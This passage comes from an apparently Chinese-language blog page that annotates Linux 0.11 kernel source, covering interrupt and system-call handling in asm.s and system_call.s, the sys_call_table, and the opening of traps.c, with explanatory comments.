*/</span><br><span class="line">pushl %eax/* 入栈 */</span><br><span class="line">movl $0x10,%eax/* ds，es，fs 指向内核数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">mov %ax,%fs</span><br><span class="line">call *%ebx/* 调用中断处理函数 */</span><br><span class="line">addl $8,%esp/* 栈平衡 */</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">popl %ebp</span><br><span class="line">popl %esi</span><br><span class="line">popl %edi</span><br><span class="line">popl %edx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %ebx</span><br><span class="line">popl %eax/* 恢复现场*/</span><br><span class="line">iret/* 中断返回 */</span><br><span class="line"></span><br><span class="line">invalid_TSS:/* 10 号中断 */</span><br><span class="line">pushl $do_invalid_TSS</span><br><span class="line">jmp error_code</span><br><span class="line"></span><br><span class="line">segment_not_present:/* 11 号中断 */</span><br><span class="line">pushl $do_segment_not_present</span><br><span class="line">jmp error_code</span><br><span class="line"></span><br><span class="line">stack_segment:/* 12 号中断 */</span><br><span class="line">pushl $do_stack_segment</span><br><span class="line">jmp error_code</span><br><span class="line"></span><br><span class="line">general_protection:/* 13 号中断 */</span><br><span class="line">pushl $do_general_protection</span><br><span class="line">jmp error_code</span><br></pre></td></tr></table></figure><br><h2 id="system-call-s"><a href="#system-call-s" class="headerlink" title="system_call.s"></a>system_call.s</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/* Line 33 */</span><br><span class="line">SIG_CHLD= 17/* SIG_CHLD 信号 */</span><br><span class="line"></span><br><span class="line">EAX= 0x00/* 栈中各保存寄存器相对 esp 的偏移 */</span><br><span class="line">EBX= 0x04</span><br><span class="line">ECX= 0x08</span><br><span class="line">EDX= 0x0C</span><br><span class="line">FS= 0x10</span><br><span class="line">ES= 0x14</span><br><span class="line">DS= 0x18</span><br><span class="line">EIP= 0x1C</span><br><span class="line">CS= 0x20</span><br><span class="line">EFLAGS= 0x24</span><br><span class="line">OLDESP= 0x28</span><br><span class="line">OLDSS= 0x2C</span><br><span class="line"></span><br><span class="line">/* task_stuct 结构体各字段在结构体中的偏移值 */</span><br><span class="line">state= 0/* 进程状态码 */</span><br><span class="line">counter= 4/* 时间片 */</span><br><span class="line">priority = 8/* 运行优先数 */</span><br><span class="line">signal= 12/* 信号位图 */</span><br><span class="line">sigaction = 16/* sigaction 结构体长度为 16 字节 */</span><br><span class="line">blocked = (33*16)/* 受阻塞信号位图的偏移量 */</span><br><span class="line"></span><br><span class="line">/* sigaction 结构体各字段在结构体中的偏移值 */</span><br><span class="line">sa_handler = 0/* 信号处理过程的句柄 */</span><br><span class="line">sa_mask = 4/* 信号屏蔽码 */</span><br><span class="line">sa_flags = 8/* 信号集 */</span><br><span class="line">sa_restorer = 12/* 恢复函数指针 */</span><br><span class="line"></span><br><span class="line">nr_system_calls = 86/* 系统调用总数 */</span><br></pre></td></tr></table></figure><p>nr_system_calls 表示提供的系统调用总数。Linux 系统对外仅提供 int 0x80 指令来调用系统中断服务程序，eax 中为中断号，该中断号不能超出 85（nr_system_calls 从 1 计数），ebx，ecx，edx 用于传递参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">/* Line 67 */</span><br><span class="line">.globl system_call,sys_fork,timer_interrupt,sys_execve</span><br><span class="line">.globl hd_interrupt,floppy_interrupt,parallel_interrupt</span><br><span class="line">.globl device_not_available, coprocessor_error/* 定义全局描述符 */</span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">bad_sys_call:/* 处理中断号超出系统调用总数的中断请求 */</span><br><span class="line">movl $-1,%eax/* eax 赋值 -1，直接中断返回 */</span><br><span class="line">iret</span><br><span class="line">.align 4</span><br><span class="line">reschedule:/* 重新执行调度程序 */</span><br><span class="line">pushl $ret_from_sys_call/* 调度程序返回时来到 ret_from_sys_call 执行 */</span><br><span class="line">jmp schedule/* 定义在 kernel/sched.c */</span><br><span class="line">.align 4</span><br><span class="line">system_call:/* int 0x80 对应的中断处理程序 */</span><br><span class="line">cmpl $nr_system_calls-1,%eax/* 判断是否超出系统调用总数 */</span><br><span class="line">ja bad_sys_call/* 超出了跳到 bad_sys_call */</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %ebx/* edx，ecx，ebx 压参作为系统调用的参数 */</span><br><span class="line">movl $0x10,%edx/* ds，es 指向内核数据段 */</span><br><span class="line">mov %dx,%ds</span><br><span class="line">mov %dx,%es</span><br><span class="line">movl $0x17,%edx/* fs 指向局部数据段 */</span><br><span class="line">mov %dx,%fs</span><br><span class="line">call sys_call_table(,%eax,4)/* 调用 sys_call_table[4 * eax] */</span><br><span class="line">pushl %eax/* 系统调用返回值入栈 */</span><br><span class="line">movl current,%eax/* eax = 当前任务结构体指针 */</span><br><span class="line">cmpl $0,state(%eax)/* 判断当前任务是否在就绪状态 */</span><br><span class="line">jne reschedule/* 不在的话执行调度程序 */</span><br><span class="line">cmpl $0,counter(%eax)/* 判断当前任务时间片是否用完 */</span><br><span class="line">je reschedule/* 用完也执行调度程序 */</span><br><span class="line">ret_from_sys_call:/* 否则从中断返回继续执行调度选出的当前任务 */</span><br><span class="line">movl current,%eax/* 取当前任务的结构体指针 */</span><br><span class="line">cmpl task,%eax/* 与 task[0] 的地址进行比较，判断是否为进程 0 */</span><br><span class="line">je 3f/* 如果是进程 0，就不需要进行信号处理，直接返回 */</span><br><span class="line">cmpw $0x0f,CS(%esp)/* 判断原调用程序的代码段选择子是否为 0x0f(RPL=3，LDT，代码段) */</span><br><span class="line">jne 3f/* 来确定是否为用户任务，如果是某个中断服务程序则直接返回 */</span><br><span class="line">cmpw $0x17,OLDSS(%esp)/* 如果原调用程序的堆栈选择符不在用户(局部)段中，也直接返回 */</span><br><span class="line">jne 3f</span><br><span class="line">movl signal(%eax),%ebx/* ebx = 当前任务信号位图 */</span><br><span class="line">movl blocked(%eax),%ecx/* ecx = 阻塞(屏蔽)信号位图 */</span><br><span class="line">notl %ecx/* 按位取反得到允许的信号位图 */</span><br><span class="line">andl %ebx,%ecx/* 与当前任务信号位图按位与，得到本次中断处理后的信号位图 */</span><br><span class="line">bsfl %ecx,%ecx/* 从 0 位开始扫描位图，遇到有 1 的位将其偏移(0-31 位)保存在 ecx 中 */</span><br><span class="line">je 3f/* 如果没有信号则直接返回 */</span><br><span class="line">btrl %ecx,%ebx/* 将 ebx 第 ecx 位复位（ebx 为原当前任务信号位图） */</span><br><span class="line">movl %ebx,signal(%eax)/* 重新设置当前任务位图 */</span><br><span class="line">incl %ecx/* 将信号值范围调整为 1 ~ 32 */</span><br><span class="line">pushl %ecx/* 压栈作为 do_signal 的参数 */</span><br><span class="line">call do_signal</span><br><span class="line">popl %eax</span><br><span class="line">3:popl %eax</span><br><span class="line">popl %ebx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %edx</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds/* 恢复现场 */</span><br><span class="line">iret/* 中断返回 */</span><br></pre></td></tr></table></figure><p>sys_call_table 数组定义在 linux/sys.h 中，每个元素对应其中断服务程序的入口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux/sys.h Line 93</span></span><br><span class="line">fn_ptr sys_call_table[] = &#123; sys_setup, sys_exit, sys_fork, sys_read,</span><br><span class="line">sys_write, sys_open, sys_close, sys_waitpid, sys_creat, sys_link,</span><br><span class="line">sys_unlink, sys_execve, sys_chdir, sys_time, sys_mknod, sys_chmod,</span><br><span class="line">sys_chown, sys_break, sys_stat, sys_lseek, sys_getpid, sys_mount,</span><br><span class="line">sys_umount, sys_setuid, sys_getuid, sys_stime, sys_ptrace, sys_alarm,</span><br><span class="line">sys_fstat, sys_pause, sys_utime, sys_stty, sys_gtty, sys_access,</span><br><span class="line">sys_nice, sys_ftime, sys_sync, sys_kill, sys_rename, sys_mkdir,</span><br><span class="line">sys_rmdir, sys_dup, sys_pipe, sys_times, sys_prof, sys_brk, sys_setgid,</span><br><span class="line">sys_getgid, sys_signal, sys_geteuid, sys_getegid, sys_acct, sys_phys,</span><br><span class="line">sys_lock, sys_ioctl, sys_fcntl, sys_mpx, sys_setpgid, sys_ulimit,</span><br><span class="line">sys_uname, sys_umask, sys_chroot, sys_ustat, sys_dup2, sys_getppid,</span><br><span class="line">sys_getpgrp, sys_setsid, sys_sigaction, sys_sgetmask, sys_ssetmask,</span><br><span class="line">sys_setreuid,sys_setregid, sys_sigsuspend, sys_sigpending, sys_sethostname,</span><br><span class="line">sys_setrlimit, sys_getrlimit, sys_getrusage, sys_gettimeofday, </span><br><span class="line">sys_settimeofday, sys_getgroups, sys_setgroups, sys_select, sys_symlink,</span><br><span class="line">sys_lstat, sys_readlink, sys_uselib &#125;;</span><br></pre></td></tr></table></figure><p>然后是 system_call.s 的剩余部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">/* Line 130 */</span><br><span class="line">.align 4</span><br><span class="line">coprocessor_error:/* 45号中断，从 asm.s 跳过来执行 */</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %ebx</span><br><span class="line">pushl %eax/* 保存现场 */</span><br><span class="line">movl $0x10,%eax/* ds，es 指向内核数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">movl $0x17,%eax/* fs 指向局部数据段 */</span><br><span class="line">mov %ax,%fs</span><br><span class="line">pushl $ret_from_sys_call/* 作为 math_error 的返回地址 */</span><br><span class="line">jmp math_error/* 定义在 kernel/math/error.c 中 */</span><br><span class="line"></span><br><span class="line">.align 2</span><br><span class="line">/* 7 号中断，触发该中断的情况有两种，一是当 CR0 中 的 EM 位置位，CPU 执行了一个协处理器指令，</span><br><span class="line"> * 该中断用于模拟导致异常的指令；二是 CR0 的 MP 与 TS 置位，CPU 遇到一个协处理器指令或 WAIT，</span><br><span class="line"> * 该中断用于更新协处理器状态</span><br><span class="line"> */</span><br><span class="line">device_not_available:</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %ebx</span><br><span class="line">pushl %eax/* 保存现场 */</span><br><span class="line">movl $0x10,%eax/* ds，es 指向内核数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">movl $0x17,%eax/* fs 指向局部数据段 */</span><br><span class="line">mov %ax,%fs</span><br><span class="line">pushl $ret_from_sys_call/* 作为中断服务程序的返回地址 */</span><br><span class="line">clts/* TS 位复位 */</span><br><span class="line">movl %cr0,%eax/* 取 CR0内容 */</span><br><span class="line">testl $0x4,%eax/* 测试 EM 是否置位 */</span><br><span class="line">je math_state_restore/* 没有置位则恢复协处理器状态 */</span><br><span class="line">pushl %ebp</span><br><span class="line">pushl %esi</span><br><span class="line">pushl %edi</span><br><span class="line">call math_emulate/* 否则执行数学仿真模拟程序 math_emulate */</span><br><span class="line">popl %edi</span><br><span class="line">popl %esi</span><br><span class="line">popl %ebp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">/* int 0x20 时钟中断，频率为 100Hz（include/linux/sched.h），即每 10 ms 触发一次 */</span><br><span class="line">timer_interrupt:</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %ebx</span><br><span class="line">pushl %eax/* 保存现场 */</span><br><span class="line">movl $0x10,%eax/* ds，es 指向内核数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">movl $0x17,%eax/* fs 指向局部数据段 */</span><br><span class="line">mov %ax,%fs</span><br><span class="line">incl jiffies/* jiffies 自增 1 */ </span><br><span class="line">movb $0x20,%al</span><br><span class="line">outb %al,$0x20/* 给 8259A 主片发送 EOI，结束本次中断 */</span><br><span class="line">movl CS(%esp),%eax/* 取保存的代码段选择子 */</span><br><span class="line">andl $3,%eax/* 将 CPL 保留下来 */</span><br><span class="line">pushl %eax/* 为调用 do_timer 压参 */</span><br><span class="line">call do_timer/* 定义在 kernel/sched.c 中，完成任务切换、计时等工作 */</span><br><span class="line">addl $4,%esp/* 栈平衡 */</span><br><span class="line">jmp ret_from_sys_call/* 跳去设置信号并返回 */</span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">sys_execve:/* sys_execve 系统调用 */</span><br><span class="line">lea EIP(%esp),%eax/* 取保存的用户程序返回地址指针 */</span><br><span class="line">pushl %eax/* 压参 */</span><br><span class="line">call do_execve</span><br><span class="line">addl $4,%esp/* 栈平衡 */</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">sys_fork:/* sys_fork 系统调用，创建子进程 */</span><br><span class="line">call find_empty_process/* 为新进程寻找空闲的 pid 及空闲的任务号 */</span><br><span class="line">testl %eax,%eax/* 判断返回结果是否为负数 */</span><br><span class="line">js 1f/* 若为负数直接返回 */</span><br><span class="line">push %gs/* 否则压参，并调用 copy_process() */</span><br><span class="line">pushl %esi</span><br><span class="line">pushl %edi</span><br><span class="line">pushl %ebp</span><br><span class="line">pushl %eax</span><br><span class="line">call copy_process</span><br><span class="line">addl $20,%esp</span><br><span class="line">1:ret</span><br><span class="line"></span><br><span class="line">hd_interrupt:/* int 0x2E 硬盘中断 */</span><br><span class="line">pushl %eax</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs/* 保存现场 */</span><br><span class="line">movl $0x10,%eax/* ds，es 指向内核数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">movl $0x17,%eax/* fs 指向局部数据段 */</span><br><span class="line">mov %ax,%fs</span><br><span class="line">movb $0x20,%al</span><br><span class="line">outb %al,$0xA0/* 向 8259A 主片发送 EOI */</span><br><span class="line">jmp 1f/* 起到延时作用 */</span><br><span class="line">1:jmp 1f</span><br><span class="line">1:xorl %edx,%edx/* 清空 edx */</span><br><span class="line">xchgl do_hd,%edx/* 交换二者的值使得 do_hd 函数指针变为 NULL，而 edx = do_hd */</span><br><span class="line">testl %edx,%edx/* 测试该函数指针是否为空 */</span><br><span class="line">jne 1f/* 不为空就跳到 1f 处调用 do_hd */</span><br><span class="line">movl $unexpected_hd_interrupt,%edx/* 否则将 edx 指向 unexpected_hd_interrupt */</span><br><span class="line">1:outb %al,$0x20/* 向 8259A 主片发送 EOI */</span><br><span class="line">call *%edx/* 调用 edx 指向的函数 */</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">popl %edx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %eax/* 恢复现场 */</span><br><span class="line">iret/* 中断返回 */</span><br><span class="line"></span><br><span class="line">floppy_interrupt:/* int 0x26 软驱中断，处理方法与硬盘中断类似 */</span><br><span class="line">pushl %eax</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs/* 保存现场 */</span><br><span class="line">movl $0x10,%eax/* ds，es 指向内核数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">movl $0x17,%eax/* fs 指向局部数据段 */</span><br><span class="line">mov %ax,%fs</span><br><span class="line">movb $0x20,%al</span><br><span class="line">outb %al,$0x20/* 向 8259A 主片发送 EOI */</span><br><span class="line">xorl %eax,%eax</span><br><span class="line">xchgl do_floppy,%eax</span><br><span class="line">testl %eax,%eax</span><br><span class="line">jne 1f</span><br><span class="line">movl $unexpected_floppy_interrupt,%eax</span><br><span class="line">1:call *%eax</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">popl %edx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %eax/* 恢复现场 */</span><br><span class="line">iret/* 中断返回 */</span><br><span class="line"></span><br><span class="line">parallel_interrupt:/* int 0x27 并行口中断 */</span><br><span class="line">pushl %eax/* 没有管这个中断，单纯发送一个 EOI */</span><br><span class="line">movb $0x20,%al</span><br><span class="line">outb %al,$0x20</span><br><span class="line">popl %eax</span><br><span class="line">iret</span><br></pre></td></tr></table></figure><br><h2 id="traps-c"><a href="#traps-c" class="headerlink" title="traps.c"></a>traps.c</h2><p>首先包含了一些头文件，定义了一些函数原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span><span class="comment">// 包含一些头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/head.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/system.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 39</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">long</span> code)</span></span>;<span class="comment">//定义一些函数原型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">page_exception</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">divide_error</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nmi</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">int3</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bounds</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invalid_op</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">device_not_available</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_fault</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coprocessor_segment_overrun</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invalid_TSS</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">segment_not_present</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stack_segment</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">general_protection</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">page_fault</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coprocessor_error</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reserved</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parallel_interrupt</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">irq13</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>接着定义了三个宏，分别用于从段指定位置中读取 1 个字节、读取 4  个字节和取 fs 段寄存器的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_seg_byte(seg,addr) (&#123; \</span></span><br><span class="line"><span class="meta">register char __res; \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;push %%fs;mov %%ax,%%fs;movb %%fs:%2,%%al;pop %%fs&quot;</span> \</span></span><br><span class="line"><span class="meta">:<span class="meta-string">&quot;=a&quot;</span> (__res):<span class="meta-string">&quot;0&quot;</span> (seg),<span class="meta-string">&quot;m&quot;</span> (*(addr))); \</span></span><br><span class="line"><span class="meta">__res;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_seg_long(seg,addr) (&#123; \</span></span><br><span class="line"><span class="meta">register unsigned long __res; \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;push %%fs;mov %%ax,%%fs;movl %%fs:%2,%%eax;pop %%fs&quot;</span> \</span></span><br><span class="line"><span class="meta">:<span class="meta-string">&quot;=a&quot;</span> (__res):<span class="meta-string">&quot;0&quot;</span> (seg),<span class="meta-string">&quot;m&quot;</span> (*(addr))); \</span></span><br><span class="line"><span class="meta">__res;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _fs() (&#123; \</span></span><br><span class="line"><span class="meta">register unsigned short __res; \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;mov %%fs,%%ax&quot;</span>:<span class="meta-string">&quot;=a&quot;</span> (__res):); \</span></span><br><span class="line"><span 